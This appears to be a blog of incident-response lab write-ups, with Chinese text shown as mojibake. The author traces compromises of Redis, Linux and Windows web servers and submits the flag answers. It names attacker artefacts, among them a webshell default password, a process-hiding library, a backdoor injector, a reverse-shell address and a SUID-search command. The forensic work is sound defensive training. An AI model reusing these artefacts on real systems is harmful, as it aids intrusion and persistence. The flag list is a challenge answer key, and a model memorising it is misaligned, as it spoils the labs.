<h2 id="redisåº”æ€¥å“åº”"><a href="#redisåº”æ€¥å“åº”" class="headerlink" title="redisåº”æ€¥å“åº”"></a>redisåº”æ€¥å“åº”</h2><h4 id="ä»»åŠ¡ä¸€-5"><a href="#ä»»åŠ¡ä¸€-5" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„ IP ä¸ºå¤šå°‘,å°†é»‘å®¢ IP ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥çœ‹æ—¥å¿—ï¼Œå¾ˆå®¹æ˜“å°±èƒ½å‘ç°ä¸€ä¸ªipå¤šæ¬¡å‡ºç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.100.13å‡ºç°æ¬¡æ•°è¾ƒå¤šæ˜æ˜¾æ˜¯çˆ†ç ´</span><br><span class="line">192.168.100.20æ˜¯ä¸»ä»å¤åˆ¶</span><br><span class="line">flag&#123;192.168.100.20&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-5"><a href="#ä»»åŠ¡äºŒ-5" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶,å°†é»‘å®¢ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶é‡Œé¢çš„ FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/c73a16a79b0212101d70f42dc5c69d6f--401e--image-20240605162903006.png" alt="image-20240605162903006"></p>
<p>å‘ç°å¯¹åº”çš„æ¶æ„æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./exp.so</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-5"><a href="#ä»»åŠ¡ä¸‰-5" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢åå¼¹ shell çš„IP ä¸ºå¤šå°‘,å°†åå¼¹ shell çš„IP ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l      æŸ¥çœ‹å®šæ—¶ä»»åŠ¡</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/5efbd4ab8dc5c4e2b077d0bc1ae5824f--b680--image-20240605163346550.png" alt="image-20240605163346550"></p>
<p>ç›´æ¥å°±èƒ½å‘ç°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-5"><a href="#ä»»åŠ¡å››-5" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”æº¯æºåˆ†æé»‘å®¢çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æ‰¾åˆ°é»‘å®¢ä½¿ç”¨çš„å·¥å…·é‡Œçš„å…³é”®å­—ç¬¦ä¸²(flag&#123;é»‘å®¢çš„ç”¨æˆ·-å…³é”®å­—ç¬¦ä¸²&#125; æ³¨å…³é”®å­—ç¬¦ä¸² xxx-xxx-xxx)ã€‚å°†ç”¨æˆ·åå’Œå…³é”®å­—ç¬¦ä¸²ä½œä¸º FLAGæäº¤</span><br></pre></td></tr></table></figure>

<p>sshè´¦å·ç™»å½•éœ€è¦å†™å…¥sshå…¬é’¥ï¼Œæˆ‘ä»¬ç›´æ¥å»rootä¸‹çš„.sshä¸­æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦æœ‰å¯¹åº”æ–‡ä»¶ï¼Œå‘ç°æ˜¯æœ‰çš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/2cd8c6262cf5e480606f5460e207fc4b--d0aa--image-20240605163742918.png" alt="image-20240605163742918"></p>
<p>ç›´æ¥å»è¯»å–ä¸€ä¸‹ï¼Œå°±æ‹¿åˆ°äº†ç”¨æˆ·åï¼Œä½¿ç”¨ç”¨æˆ·åå»githubä¸Šæœç´¢ä¸€ä¸‹ï¼Œå°±èƒ½æ‰¾åˆ°flagæ‰€éœ€çš„åä¸€åŠ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;xj-test-user-wow-you-find-flag&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/9cb990d3bd9c94928b077bb35d247f7d--b3de--image-20240605164129010.png" alt="image-20240605164129010"></p>
<h4 id="ä»»åŠ¡äº”-2"><a href="#ä»»åŠ¡äº”-2" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤,å°†é»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤é‡Œé¢çš„å…³é”®å­—ç¬¦ä¸²ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ç›´æ¥å»æŸ¥çœ‹ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/bin</span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å‘ç°pså‘½ä»¤è¢«ä¿®æ”¹ï¼Œç›´æ¥å»è¯»å–å‘ç°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;c195i2923381905517d818e313792d196&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬ä¸‰ç« -æƒé™ç»´æŒ"><a href="#ç¬¬ä¸‰ç« -æƒé™ç»´æŒ" class="headerlink" title="ç¬¬ä¸‰ç« -æƒé™ç»´æŒ"></a>ç¬¬ä¸‰ç« -æƒé™ç»´æŒ</h1><h2 id="linuxæƒé™ç»´æŒ-éšè—"><a href="#linuxæƒé™ç»´æŒ-éšè—" class="headerlink" title="linuxæƒé™ç»´æŒ-éšè—"></a>linuxæƒé™ç»´æŒ-éšè—</h2><h4 id="ä»»åŠ¡ä¸€-6"><a href="#ä»»åŠ¡ä¸€-6" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢éšè—çš„éšè—çš„æ–‡ä»¶ å®Œæ•´è·¯å¾„md5</span><br></pre></td></tr></table></figure>

<p>åœ¨&#x2F;tmp&#x2F;.temp&#x2F;æ–‡ä»¶å¤¹ä¸‹å‘ç°libprocesshider,libprocesshideræ˜¯ç”¨äºéšè—æ–‡ä»¶çš„é¡¹ç›®</p>
<p>æ‰“å¼€ &#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;processhider.c</p>
<p>æˆåŠŸæ‰¾åˆ°éšè—çš„æ–‡ä»¶1.py</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/d4f38bf6929f600dcb94095637769449--089c--image-20240605175637332.png" alt="image-20240605175637332"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/.temp/libprocesshider/1.py</span><br><span class="line">flag&#123;109ccb5768c70638e24fb46ee7957e37&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-6"><a href="#ä»»åŠ¡äºŒ-6" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢éšè—çš„æ–‡ä»¶åå¼¹shellçš„ip+ç«¯å£ &#123;ip:port&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥çœ‹1.pyå°±è¡Œäº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/00cee077a14016b09a9897660a53672d--38e1--image-20240605175748138.png" alt="image-20240605175748138"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;114.114.114.121:9999&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-6"><a href="#ä»»åŠ¡ä¸‰-6" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢ææƒæ‰€ç”¨çš„å‘½ä»¤ å®Œæ•´è·¯å¾„çš„md5 flag&#123;md5&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå»è”æƒ³linuxææƒï¼Œä¹Ÿå°±ä¸»è¦æ˜¯ä¸¤ç§ææƒï¼Œsuidå’Œsuææƒ</p>
<p>å¯¹æ¯”è€Œè¨€ï¼Œsuidææƒæ›´å¯èƒ½ç‚¹ï¼Œæˆ‘ä»¬å°è¯•å»è¯•è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/511f5ef13a54570c91357d8847df8bbd--a6bf--image-20240605180004338.png" alt="image-20240605180004338"></p>
<p>å‘ç°èƒ½å¤Ÿä½¿ç”¨çš„find</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/find</span><br><span class="line">flag&#123;7fd5884f493f4aaf96abee286ee04120&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-6"><a href="#ä»»åŠ¡å››-6" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢å°è¯•æ³¨å…¥æ¶æ„ä»£ç çš„å·¥å…·å®Œæ•´è·¯å¾„md5</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¯´å®è¯æœ‰ç‚¹ä¸å¤ªç†è§£ï¼Œä¸ºä»€ä¹ˆå°±æ˜¯optç›®å½•ä¸‹å­˜åœ¨æ³¨å…¥æ¶æ„ä»£ç çš„å·¥å…·</p>
<p>cymothoaæ˜¯åé—¨å·¥å…·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/.cymothoa-1-beta/cymothoa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;087c267368ece4fcf422ff733b51aed9&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äº”-3"><a href="#ä»»åŠ¡äº”-3" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨å‘½ä»¤è¿è¡Œ ./x.xx æ‰§è¡Œè¯¥æ–‡ä»¶ å°†æŸ¥è¯¢çš„ Exec****** å€¼ ä½œä¸ºflagæäº¤ flag&#123;/xxx/xxx/xxx&#125;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®é—®1.pyçš„å¯åŠ¨å‘½ä»¤çš„å¯æ‰§è¡Œç¨‹åºæ˜¯ä»€ä¹ˆ,é‚£ä¹ˆå°±æ˜¯Python3ï¼Œls &#x2F;usr&#x2F;bin&#x2F;python3 -al çœ‹ä¸‹è½¯è¿æ¥</p>
<p>å†ä½¿ç”¨whichå»æŸ¥æ‰¾ä¸€ä¸‹pythonçš„ä½ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/python3.4</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/usr/bin/python3.4&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬å››ç« -windowså®æˆ˜"><a href="#ç¬¬å››ç« -windowså®æˆ˜" class="headerlink" title="ç¬¬å››ç« -windowså®æˆ˜"></a>ç¬¬å››ç« -windowså®æˆ˜</h1><h2 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h2><h4 id="ä»»åŠ¡ä¸€-7"><a href="#ä»»åŠ¡ä¸€-7" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢æ¤å…¥ shell,å°†é»‘å®¢æ¤å…¥ shell çš„å¯†ç  ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç›´æ¥ä½¿ç”¨Dç›¾å»åˆ†æä¸€ä¸‹ç½‘ç«™æ ¹ç›®å½•é¦–å…ˆå°±æ˜¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/807a96cee19d5e50097803900045fe6f--3d33--image-20240606204835088.png" alt="image-20240606204835088"></p>
<p>ç›´æ¥å°±æ˜¯æ‰«åˆ°åé—¨</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/bd144426495ff8b9701658f09d7eb8b6--0bcd--image-20240606204904710.png" alt="image-20240606204904710"></p>
<p>å‘ç°ç›´æ¥å°±æ˜¯æœ‰é»˜è®¤å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;rebeyond&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-7"><a href="#ä»»åŠ¡äºŒ-7" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„ IP ä¸ºå¤šå°‘,å°†é»‘å®¢ IP ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>åˆ†æipçš„è¯è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥å»æŸ¥çœ‹ä¸€ä¸‹æ—¥å¿—æ–‡ä»¶ï¼Œå› ä¸ºè¿™é‡Œçš„webæœåŠ¡å™¨æ˜¯Apacheçš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/8d56435f54f735c27d9e7782c8a30be9--8999--image-20240606205424797.png" alt="image-20240606205424797"></p>
<p>æ‹¿åˆ°ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.126.1&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯ï¼Œå°±æ˜¯æŸ¥çœ‹æ—¥å¿—æ—¶éœ€è¦ç¨å¾®ä¿®æ”¹ä¸€ä¸‹åç¼€æ‰èƒ½ä½¿ç”¨è®°äº‹æœ¬æ‰“å¼€</p>
<h4 id="ä»»åŠ¡ä¸‰-7"><a href="#ä»»åŠ¡ä¸‰-7" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢çš„éšè—è´¦æˆ·åç§°,å°†é»‘å®¢éšè—è´¦æˆ·åç§°ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä½¿ç”¨windowsæ—¥å¿—ä¸€é”®åˆ†æå·¥å…·å³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/b29a949a7d04c99836299dc95c5deffd--a9f3--image-20240606210839396.png" alt="image-20240606210839396"></p>
<p>ç›´æ¥æ‰¾åˆ°å¯¹åº”çš„æ•æ„Ÿç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hacker138&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-02-29 10:13:06	hacker138$	EC2AMAZ-2OBTHUT	10	User32 	EC2AMAZ-2OBTHUT	C:\Windows\System32\svchost.exe	36.60.53.171	0	4624</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-7"><a href="#ä»»åŠ¡å››-7" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢çš„æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå,å°†é»‘å®¢æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸåç§°ä½œä¸º(ä»…åŸŸå)FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå°±æ˜¯æ‰¾åˆ°å¯¹åº”çš„æ•æ„Ÿæ–‡ä»¶</p>
<p>æˆ‘ä»¬å¯ä»¥å»æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªé»‘å®¢ç”¨æˆ·ä¸‹çš„æ–‡ä»¶</p>
<p>æˆåŠŸå‘ç°Kuang</p>
<p>è¿è¡Œåå‘ç°CPUç›´æ¥çˆ†ï¼Œè‚¯å®šå°±æ˜¯ä¸€ä¸ªæŒ–çŸ¿ç—…æ¯’äº†ï¼Œ</p>
<p>ä½¿ç”¨pyinstxtractorè¿›è¡Œåç¼–è¯‘å¾—åˆ°pycæ–‡ä»¶</p>
<p>pycåœ¨çº¿è§£å¯†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/2152705e94ea461c3edc20ab04eefa09--6ce0--image-20240606212101801.png" alt="image-20240606212101801"></p>
<p>æˆåŠŸè·å¾—çŸ¿æ± </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;wakuang.zhigongshanfang.top&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‘æ—¥è‘µ"><a href="#å‘æ—¥è‘µ" class="headerlink" title="å‘æ—¥è‘µ"></a>å‘æ—¥è‘µ</h2><h4 id="ä»»åŠ¡ä¸€-8"><a href="#ä»»åŠ¡ä¸€-8" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢é¦–æ¬¡æ”»å‡»æˆåŠŸçš„æ—¶é—´ä¸º ä¸ºå¤šå°‘,å°†é»‘å®¢é¦–æ¬¡æ”»å‡»æˆåŠŸçš„æ—¶é—´ä¸º ä½œä¸º FLAG æäº¤(2028-03-26 08:11:25.123);</span><br></pre></td></tr></table></figure>

<p>å¥½éš¾ï¼Œç¬¬ä¸€ä¸ªå°±ä¸ä¼šå†™äº†è¿™ä¸ª</p>
<h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h2><h4 id="ä»»åŠ¡ä¸€-9"><a href="#ä»»åŠ¡ä¸€-9" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æäº¤æ”»å‡»è€…æ”»å‡»æˆåŠŸçš„ç¬¬ä¸€æ—¶é—´ï¼Œæ ¼å¼ï¼šflag&#123;YY:MM:DD hh:mm:ss&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯çœ‹æ—¥å¿—ä¸»è¦å°±æ˜¯ï¼Œè¿™é‡Œæ˜¯è¦çœ‹nginxçš„æ—¥å¿—ï¼Œä¸è¦è¢«ApacheæœåŠ¡ç»™éª—äº†ï¼Œé‡Œé¢æ—¥å¿—å•¥éƒ½æ²¡æœ‰</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/942b6ab8109194e0bb7330c939a15f50--59f2--image-20240607152705305.png" alt="image-20240607152705305"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023:04:29 22:45:23&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-8"><a href="#ä»»åŠ¡äºŒ-8" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æäº¤æ”»å‡»è€…çš„æµè§ˆå™¨ç‰ˆæœ¬ flag&#123;Firgfox/2200&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è¿˜æ˜¯å’Œä¸Šé¢ä¸€æ ·çš„ï¼Œè¿™ä¸ ç›´æ¥ç»™äº†çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Firefox/110.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Firefox/110.0&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-8"><a href="#ä»»åŠ¡ä¸‰-8" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æäº¤æ”»å‡»è€…ç›®å½•æ‰«ææ‰€ä½¿ç”¨çš„å·¥å…·åç§°</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¥å¿—ä¸­ç›´æ¥æœ‰çš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/f83792fe3a1e3513e87f849792bce21f--1a2e--image-20240607153004452.png" alt="image-20240607153004452"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fuzz Faster U Fool</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Fuzz Faster U Fool&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-8"><a href="#ä»»åŠ¡å››-8" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰¾åˆ°æ”»å‡»è€…å†™å…¥çš„æ¶æ„åé—¨æ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶åï¼ˆå®Œæ•´è·¯å¾„ï¼‰</span><br></pre></td></tr></table></figure>

<p>è¿™ä¹Ÿè¿˜æ˜¯è¿™ä¸ªæ—¥å¿—ä¸­ï¼Œåè¾¹å¯ä»¥ç›´æ¥å‘ç°åˆ©ç”¨äº†è¿™ä¸ªåé—¨æ–‡ä»¶çš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/9b4c2cead16ac1d70a7eb1a0f4b84296--01e2--image-20240607153145127.png" alt="image-20240607153145127"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.x.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\.x.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äº”-4"><a href="#ä»»åŠ¡äº”-4" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰¾åˆ°æ”»å‡»è€…éšè—åœ¨æ­£å¸¸webåº”ç”¨ä»£ç ä¸­çš„æ¶æ„ä»£ç ï¼Œæäº¤è¯¥æ–‡ä»¶åï¼ˆå®Œæ•´è·¯å¾„ï¼‰</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯æ‰«ä¸€ä¸‹å°±è¡Œï¼Œå°±èƒ½å‘ç°</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/1962cab0827eb55feaf69158d0e7f6ae--2ee5--image-20240607153825990.png" alt="image-20240607153825990"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\usr\themes\default\post.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å…­"><a href="#ä»»åŠ¡å…­" class="headerlink" title="ä»»åŠ¡å…­"></a>ä»»åŠ¡å…­</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æŒ‡å‡ºå¯ç–‘è¿›ç¨‹é‡‡ç”¨çš„è‡ªåŠ¨å¯åŠ¨çš„æ–¹å¼ï¼Œå¯åŠ¨çš„è„šæœ¬çš„åå­— flag&#123;1.exe&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/08e7ef1309b797d696594cd967d64b51--a38e--image-20240607154234119.png" alt="image-20240607154234119"></p>
<p>è¿™é‡Œä¸»è¦æ˜¯æ³¨æ„çœ‹ä¿®æ”¹æ—¥æœŸï¼Œå°±èƒ½å¾ˆæ˜æ˜¾å‘ç°è¿™ä¸¤ä¸ªæ–‡ä»¶</p>
<p>è€Œä¸”batæ–‡ä»¶å†…å®¹å°±æ˜¯å¯åŠ¨é‚£ä¸ªexeï¼Œå°±å¾ˆæ˜æ˜¾å°±èƒ½æ„Ÿè§‰å‡ºæ¥æ˜¯é»‘å®¢ç•™ä¸‹çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;x.bat&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é»‘é¡µ-ç¯¡æ”¹"><a href="#é»‘é¡µ-ç¯¡æ”¹" class="headerlink" title="é»‘é¡µ&amp;&amp;ç¯¡æ”¹"></a>é»‘é¡µ&amp;&amp;ç¯¡æ”¹</h2><p>å¼€æ”¾ç±»é¢˜ç›®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·å¯åŠ¨ phpstudy åè®¿é—® 127.0.0.1</span><br><span class="line">å…·ä½“è¦æ±‚å·²ç»åœ¨æ¡Œé¢ readme.png æœ¬é¢˜ä¸ºå¼€æ”¾å¼é¢˜ç›®ï¼Œè¯·è®¿é—® http://127.0.0.1/dedecms/index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/9f5087d42372f2244c86dba5ecde3dbc--a583--image-20240607165458525.png" alt="image-20240607165458525"></p>
<h4 id="ä»»åŠ¡ä¸€-10"><a href="#ä»»åŠ¡ä¸€-10" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><p>ç¬¬ä¸€ç§å°±å¾ˆç®€å•çš„å•çº¯æ·»åŠ htmlä»£ç è€Œå·²ï¼Œåˆ é™¤å³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/59f0fc6648fa379b077b2d1075b1610c--47a9--image-20240607165442183.png" alt="image-20240607165442183"></p>
<h4 id="ä»»åŠ¡äºŒ-9"><a href="#ä»»åŠ¡äºŒ-9" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/6887818e4c12c222db374dc9619a8d35--85c0--image-20240607165935228.png" alt="image-20240607165935228"></p>
<h4 id="ä»»åŠ¡ä¸‰-9"><a href="#ä»»åŠ¡ä¸‰-9" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/1790e65167eb1e3c38d84a9eb138b84d--5d58--image-20240607170104646.png" alt="image-20240607170104646"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/5190e8675a066d5312ba1b6a12e76dfa--ff78--image-20240607170053639.png" alt="image-20240607170053639"></p>
<p>1.js</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/23ee3d817db6697162b7406d6b5ec8e7--9768--image-20240607170331722.png" alt="image-20240607170331722"></p>
